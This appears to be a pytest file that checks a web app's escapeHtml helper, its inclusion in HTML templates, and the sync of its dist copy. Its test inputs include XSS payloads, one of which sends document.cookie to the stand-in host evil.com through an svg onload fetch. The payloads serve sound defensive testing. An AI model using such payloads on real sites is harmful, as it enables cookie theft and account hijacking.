# -*- coding: utf-8 -*-
"""
Tests for Phase 8 Step 1: Universal escapeHtml in static/js/utils.js.
Verifies:
1. utils.js exports escapeHtml and attaches to window / globalThis.
2. XSS payload escaping, special characters, and null/undefined handling.
3. Inclusion in templates/index.html and secondary window templates.
4. Dist folder synchronization.
"""

from pathlib import Path
import re


def _simulate_js_escape_html(val):
    """Exact python simulation of utils.js escapeHtml."""
    if val is None:
        return ""
    s = str(val)
    mapping = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#039;",
    }
    return re.sub(r'[&<>"\']', lambda m: mapping[m.group(0)], s)


def test_utils_js_declares_universal_escape_html():
    utils_path = Path("static/js/utils.js")
    assert utils_path.exists(), "static/js/utils.js must exist"
    content = utils_path.read_text(encoding="utf-8")

    assert "function escapeHtml" in content
    assert "window.escapeHtml = escapeHtml" in content
    assert "globalThis.escapeHtml = escapeHtml" in content
    assert "module.exports" in content
    assert "&amp;" in content
    assert "&lt;" in content
    assert "&gt;" in content
    assert "&quot;" in content
    assert "&#039;" in content


def test_escape_html_xss_payloads_and_special_chars():
    # 1. Dangerous XSS vectors
    xss_payloads = [
        ("<img src=x onerror=alert(1)>", "&lt;img src=x onerror=alert(1)&gt;"),
        ("<script>alert('xss')</script>", "&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;"),
        ("<svg/onload=fetch('//evil.com/'+document.cookie)>", "&lt;svg/onload=fetch(&#039;//evil.com/&#039;+document.cookie)&gt;"),
        ("hello 'world' & \"quotes\"", "hello &#039;world&#039; &amp; &quot;quotes&quot;"),
        ("1 < 2 && 4 > 3", "1 &lt; 2 &amp;&amp; 4 &gt; 3"),
    ]
    for raw, expected in xss_payloads:
        assert _simulate_js_escape_html(raw) == expected

    # 2. Null / undefined / empty
    assert _simulate_js_escape_html(None) == ""
    assert _simulate_js_escape_html("") == ""

    # 3. Numeric values
    assert _simulate_js_escape_html(12345) == "12345"
    assert _simulate_js_escape_html(0) == "0"


def test_templates_include_utils_js():
    templates_to_check = [
        "templates/index.html",
        "templates/profiler_window.html",
        "templates/query_history_window.html",
        "templates/settings_window.html",
    ]
    for t_path in templates_to_check:
        path = Path(t_path)
        assert path.exists(), f"{t_path} must exist"
        content = path.read_text(encoding="utf-8")
        assert "static/js/utils.js" in content, f"{t_path} must include static/js/utils.js"


def test_dist_sync_utils_js():
    dist_utils = Path("dist/LLTool/_internal/static/js/utils.js")
    src_utils = Path("static/js/utils.js")
    assert dist_utils.exists()
    assert dist_utils.read_text(encoding="utf-8") == src_utils.read_text(encoding="utf-8")
